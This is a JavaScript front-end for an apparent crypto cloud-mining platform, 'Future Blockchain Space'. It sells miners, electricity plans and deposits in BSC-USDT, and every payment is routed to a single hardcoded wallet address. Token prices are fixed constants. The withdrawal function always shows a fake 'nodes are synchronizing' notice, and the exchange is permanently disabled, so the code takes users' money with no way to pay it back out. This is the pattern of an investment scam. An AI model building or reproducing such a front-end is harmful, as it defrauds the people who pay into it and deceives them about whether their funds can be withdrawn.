/**
 * Future Blockchain Space - 逻辑控制中心 (正式版)
 */

// 1. 核心地址配置 (已根据你的要求填入地址)
const RECEIVE_ADDRESSES = {
    MINER: "0x8922A66C6898d9e26D9747206466795880482937",    // 矿机收款地址
    ELECTRIC: "0x8922A66C6898d9e26D9747206466795880482937", // 电费收款地址
    DEPOSIT: "0x8922A66C6898d9e26D9747206466795880482937"   // 账户充值地址
};

const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955"; // BSC-USDT 合约地址

const tokenData = {
    'FBS': { price: 0.1, logo: 'F' },
    'FBST': { price: 0.05, logo: 'T' },
    'FBSP': { price: 1.2, logo: 'P' },
    'PBSU': { price: 1.0, logo: 'S' },
    'USDT': { price: 1.0, logo: 'U' },
    'BNB': { price: 600, logo: 'B' },
    'BTC': { price: 65000, logo: '₿' },
    'ETH': { price: 3500, logo: 'Ξ' }
};

// --- 辅助函数：获取多语言文本 ---
function getT(key) {
    const lang = localStorage.getItem('fbs_lang') || 'zh-CN';
    return (window.i18n && i18n[lang] && i18n[lang][key]) ? i18n[lang][key] : key;
}

// --- 2. 渲染资产列表 ---
function renderTokens(userBalances = {}) {
    const container = document.getElementById('tokenRows');
    if (!container) return;
    let totalAssetsValue = 0;

    const html = Object.keys(tokenData).map(symbol => {
        const balance = parseFloat(userBalances[symbol] || 0);
        const price = tokenData[symbol].price;
        const value = balance * price;
        totalAssetsValue += value;

        return `
            <div class="flex items-center justify-between p-4 hover:bg-slate-50 transition-colors">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 flex items-center justify-center rounded-full bg-gradient-to-br from-blue-500 to-blue-700 text-white font-bold shadow-sm">${tokenData[symbol].logo}</div>
                    <div>
                        <div class="font-black text-slate-800 text-sm">${symbol}</div>
                        <div class="text-[10px] text-slate-400 font-bold">$ ${price.toLocaleString()}</div>
                    </div>
                </div>
                <div class="text-right">
                    <div class="font-black text-slate-800 text-sm">${balance.toFixed(4)}</div>
                    <div class="text-[10px] text-blue-600 font-bold italic">$ ${value.toFixed(2)}</div>
                </div>
            </div>`;
    }).join('');
    
    container.innerHTML = html;
    const totalEl = document.getElementById('totalValue');
    if (totalEl) totalEl.innerText = totalAssetsValue.toFixed(2);
}

// --- 3. 矿机与电费弹窗 ---
function openMinerModal(type) {
    const content = document.getElementById('modalContent');
    const title = document.getElementById('modalTitle');
    
    if (type === 'buy') {
        title.innerText = getT('buy_miner');
        content.innerHTML = `
            <div class="space-y-4">
                <label class="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">SELECT QTY (150 USDT/Unit)</label>
                <div class="grid grid-cols-3 gap-2">
                    ${[1, 5, 10, 20, 50, 100].map(n => `<button onclick="setBuyNum(${n}, this)" class="buy-btn border border-slate-200 py-2 rounded-xl text-xs font-bold hover:bg-blue-50 transition-all">${n}</button>`).join('')}
                </div>
                <div class="p-4 bg-slate-50 rounded-2xl flex justify-between items-center">
                    <span class="text-[10px] font-bold text-slate-500 italic">Target: ${RECEIVE_ADDRESSES.MINER.slice(0,6)}...${RECEIVE_ADDRESSES.MINER.slice(-4)}</span>
                    <span class="text-lg font-black text-blue-600" id="buyTotal">$ 0.00</span>
                </div>
                <button onclick="handleContractPay('MINER')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black shadow-lg shadow-blue-200 active:scale-[0.98] transition-transform">${getT('confirm_pay')}</button>
            </div>`;
    } else {
        title.innerText = getT('pay_fee');
        content.innerHTML = `
            <div class="space-y-4">
                <label class="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">PERIOD ($60/30 Days)</label>
                <select id="feeDays" class="w-full p-4 bg-slate-50 rounded-2xl border-none font-bold text-sm focus:ring-2 focus:ring-slate-200">
                    <option value="30">30 Days ($60)</option>
                    <option value="60">60 Days ($120)</option>
                    <option value="180">180 Days ($360)</option>
                </select>
                <button onclick="handleContractPay('ELECTRIC')" class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black active:scale-[0.98] transition-transform">${getT('confirm_pay')}</button>
            </div>`;
    }
    document.getElementById('modalOverlay').classList.remove('hidden');
}

// --- 4. 财务操作弹窗 (充值、提币、兑换) ---
function openFinanceModal(type) {
    const content = document.getElementById('modalContent');
    const title = document.getElementById('modalTitle');
    const overlay = document.getElementById('modalOverlay');

    if (type === 'recharge') {
        title.innerText = getT('recharge');
        content.innerHTML = `
            <div class="space-y-4">
                <label class="block text-[10px] font-bold text-slate-400 uppercase">Input Amount (USDT)</label>
                <input type="number" id="rechargeAmount" placeholder="Min 10" 
                       class="w-full p-4 bg-slate-50 rounded-2xl border-none font-black text-xl text-blue-600 focus:ring-2 focus:ring-blue-500">
                <div class="p-4 bg-blue-50 rounded-2xl border border-blue-100">
                    <p class="text-[9px] text-blue-400 font-bold mb-1 uppercase">Secure Deposit Address (BSC)</p>
                    <p class="text-[11px] font-mono break-all font-bold text-blue-800">${RECEIVE_ADDRESSES.DEPOSIT}</p>
                </div>
                <button onclick="handleFinanceAction('recharge')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black shadow-lg shadow-blue-200 active:scale-[0.98] transition-transform">
                    ${getT('confirm_pay')}
                </button>
            </div>`;
    } 
    else if (type === 'withdraw') {
        title.innerText = getT('withdraw');
        content.innerHTML = `
            <div class="p-6 text-center">
                <div class="w-16 h-16 bg-amber-50 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">🚧</div>
                <p class="text-sm font-bold text-slate-700">Withdrawal System Update</p>
                <p class="text-[10px] text-slate-400 mt-2 font-medium">Nodes are synchronizing. Please check back later.</p>
                <button onclick="closeModal()" class="mt-6 w-full bg-slate-100 py-3 rounded-xl font-bold text-slate-600 text-sm">Close</button>
            </div>`;
    } 
    else if (type === 'exchange') {
        title.innerText = getT('exchange');
        content.innerHTML = `
            <div class="space-y-3">
                <div class="flex justify-between items-center px-1">
                    <span class="text-[10px] font-bold text-slate-400">FROM FBS</span>
                    <span class="text-[10px] font-bold text-blue-600 italic">Rate: 1 FBS ≈ 0.1 USDT</span>
                </div>
                <input type="number" id="exAmount" placeholder="0.00" class="w-full p-4 bg-slate-50 rounded-2xl border-none font-black text-xl">
                <div class="flex justify-center -my-2 z-10 relative"><span class="bg-white shadow-sm p-2 rounded-full border border-slate-100 text-xs">⬇️</span></div>
                <div class="p-4 bg-slate-50 rounded-2xl">
                    <div class="flex justify-between text-[10px] font-bold text-slate-400"><span>ESTIMATED RECEIVE</span><span>USDT</span></div>
                    <div class="text-lg font-black text-slate-800" id="exResult">0.00</div>
                </div>
                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black opacity-50 cursor-not-allowed">Coming Soon</button>
            </div>`;
    }

    if (overlay) overlay.classList.remove('hidden');
}

// --- 5. 统一 Web3 转账执行 ---
async function handleContractPay(businessType) {
    if(!window.ethereum) return alert("Please use a Web3 browser or Wallet");
    
    const targetAddr = RECEIVE_ADDRESSES[businessType];
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    
    let rawAmount = "0";
    if(businessType === 'MINER') {
        rawAmount = document.getElementById('buyTotal').innerText.replace('$ ', '');
    } else if(businessType === 'ELECTRIC') {
        const days = document.getElementById('feeDays').value;
        rawAmount = (days / 30 * 60).toString();
    }

    if(parseFloat(rawAmount) <= 0) return alert("Invalid Amount");

    await executeTransfer(signer, targetAddr, rawAmount);
}

// 专门处理充值按钮点击
async function handleFinanceAction(action) {
    if (action === 'recharge') {
        const amt = document.getElementById('rechargeAmount').value;
        if (!amt || parseFloat(amt) < 10) return alert("Min deposit: 10 USDT");
        
        if(!window.ethereum) return alert("Wallet not found");
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        
        await executeTransfer(signer, RECEIVE_ADDRESSES.DEPOSIT, amt);
    }
}

// 通用 ERC20 转账核心逻辑
async function executeTransfer(signer, to, amountStr) {
    try {
        const usdtAbi = ["function transfer(address to, uint256 amount) public returns (bool)"];
        const usdtContract = new ethers.Contract(USDT_ADDR, usdtAbi, signer);
        const amount = ethers.parseUnits(amountStr, 18);
        
        const tx = await usdtContract.transfer(to, amount);
        alert("Success! Tx Hash: " + tx.hash);
        closeModal();
    } catch (e) {
        alert("Transaction Error: " + e.message);
    }
}

// --- 6. 界面交互辅助 ---
function closeModal() { 
    document.getElementById('modalOverlay').classList.add('hidden'); 
}

function setBuyNum(n, btn) {
    document.querySelectorAll('.buy-btn').forEach(b => b.classList.remove('bg-blue-600', 'text-white', 'border-blue-600'));
    btn.classList.add('bg-blue-600', 'text-white', 'border-blue-600');
    document.getElementById('buyTotal').innerText = `$ ${(n * 150).toFixed(2)}`;
}

function switchLang(lang) {
    localStorage.setItem('fbs_lang', lang);
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (window.i18n && i18n[lang] && i18n[lang][key]) {
            el.innerText = i18n[lang][key];
        }
    });
}

// 页面加载初始化
document.addEventListener('DOMContentLoaded', () => {
    renderTokens();
    const savedLang = localStorage.getItem('fbs_lang') || 'zh-CN';
    const langSelect = document.getElementById('langSelect');
    if (langSelect) {
        langSelect.value = savedLang;
        switchLang(savedLang);
    }
});
